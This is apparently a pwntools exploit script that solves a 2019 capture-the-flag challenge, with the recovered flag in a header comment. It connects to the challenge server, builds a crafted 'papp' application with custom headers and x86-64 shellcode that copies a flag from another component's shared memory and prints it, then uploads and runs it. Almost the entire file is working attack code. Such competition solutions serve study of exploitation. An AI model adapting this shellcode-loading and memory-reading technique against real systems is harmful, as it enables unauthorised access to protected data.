#!/usr/bin/env python
# -*- coding: utf-8 -*-

# OOO{c1c54538b346dd9c393611af8c06de45}

from pwn import *   # pip install pwntools
context.arch = "amd64"

r = remote("lcars000.quals2019.oooverflow.io", 5000)
print r.recvuntil("init\n")

r.sendline("run flag1.papp")
r.recvuntil("flag1 exit 0\n")

app = "EFIL"
app += p32(1)
app = app.ljust(40, "\x00")

app += p32(0x20000)  # addr
app += p32(0x1000)   # size
app += p32(5)        # prot

code = """
    /* copy flag from shared mem of crypto.sys */
    mov rsi, 0x4204f790
    mov rdi, 0x30000000
    mov rcx, 100
    rep movsb
    /* output */
    mov rdi, 0
    mov rsi, 0
    mov edx, 50
    call ioctl

    mov rdi, 0x99
    call sys_exit

sys_read:
    xor eax, eax
    syscall
    ret

sys_write:
    mov eax, 1
    syscall
    ret

sys_exit:
    mov eax, 60
    syscall
    ret

ioctl:
    sub     rsp, 0x38
    mov     [rsp+0x14], esi
    lea     rsi, [rsp+0x10]
    mov     [rsp+0x10], edi
    mov     [rsp+0x18], edx
    xor     edi, edi
    mov     edx, 0x14
    mov     [rsp+0x1C], ecx
    mov     [rsp+0x20], r8d
    call    sys_write

    lea     rsi, [rsp+0x0C]
    mov     edx, 4
    mov     edi, 1
    mov     dword ptr [rsp+0x0C], 0
    call    sys_read

    mov     eax, [rsp+0x0C]
    add     rsp, 0x38
    ret
"""
app += asm(code).ljust(0x1000, "\x90")

r.sendline("download test.papp %d" % len(app))
r.send(app)
r.sendline("run test.papp")
r.interactive()
